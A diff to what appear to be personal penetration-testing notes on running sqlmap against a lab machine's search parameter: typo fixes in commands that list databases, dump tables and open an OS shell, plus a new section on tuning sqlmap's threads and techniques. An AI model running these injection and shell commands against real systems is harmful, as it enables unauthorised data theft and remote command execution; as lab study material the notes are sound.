@@ -11,19 +11,19 @@
 Start with database detection:
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php?search=test" --dbs
+sqlmap -u "http://10.129.228.235/dashboard.php?search=test" --dbs
 ```
 
 If you need to specify the parameter:
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php" --data="search=test" --dbs
+sqlmap -u "http://10.129.228.235/dashboard.php" --data="search=test" --dbs
 ```
 
 For GET parameter (your case):
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --dbs
+sqlmap -u "http://10.129.228.235/dashboard.php?search=*" --dbs
 ```
 
 ## Common SQLMap Options
@@ -31,25 +31,25 @@ bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --dbs
 Get current database:
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --current-db
+sqlmap -u "http://10.129.228.235/dashboard.php?search=*" --current-db
 ```
 
 List tables in a database:
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" -D database_name --tables
+sqlmap -u "http://10.129.228.235/dashboard.php?search=*" -D database_name --tables
 ```
 
 Dump table contents:
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" -D database_name -T table_name --dump
+sqlmap -u "http://10.129.228.235/dashboard.php?search=*" -D database_name -T table_name --dump
 ```
 
 ## Get OS shell:
 
 ```bash
-bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --os-shell
+sqlmap -u "http://10.129.228.235/dashboard.php?search=*" --os-shell
 ```
 
 ## Useful Flags
@@ -177,6 +177,29 @@ sqlmap -r request.txt --os-pwn
 # haven't figured a way to get a reverse shell for now aside from direct SQL injection. See notes
 ```
 
+## It looks hung (Ippsec)
+
+sqlmap's default is **1 thread** and technique set **BEUSTQ**. Time-based (`T`) in particular can sit there for minutes with almost no output.
+
+Feed it what you already learned from the request / manual enum (`-r`, `--dbms`, UNION column count) so it does not rediscover the world:
+
+```bash
+# You already saved the request (Method 1 above)
+sqlmap -r request.txt -p search --dbms=mysql --technique=U --batch --threads=10 -o --dbs
+
+# -p            only the param you know is injectable
+# --dbms        skip fingerprinting every engine
+# --technique=U UNION only — if ORDER BY already gave you the column count
+# --technique=BEU  skip time-based T (the slow one)
+# --batch       do not pause on prompts (looks frozen)
+# --threads=10  max sqlmap will use
+# -o            optimization bundle (keep-alive / null-connection / predict-output)
+# -v 3          print payloads so you can see it is working
+# --flush-session  if an earlier slow run cached technique=T
+```
+
+If the only vector is a delay, you are stuck with `--technique=T` — then `--threads=1` and be patient, or dump with a UNION you built by hand instead.
+
 ## Resources
 
 - [sqlmap](https://sqlmap.org/) — official project homepage
@@ -184,3 +207,6 @@ sqlmap -r request.txt --os-pwn
 - [jQuery 2.1.3](https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js) — URL inside the captured Burp response
 - [jQuery tablesorter](https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js) — URL inside the captured Burp response
 - [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap) — source and docs
+- [sqlmap usage (optimization)](https://github.com/sqlmapproject/sqlmap/wiki/Usage) — `-o`, `--threads`, `--technique`
+- [Manual SQLi](./manual.md) — ORDER BY / UNION before handing off
+- [SQL reverse shells](../../infiltration/reverse-shell/sql.md) — `--os-shell` alternative
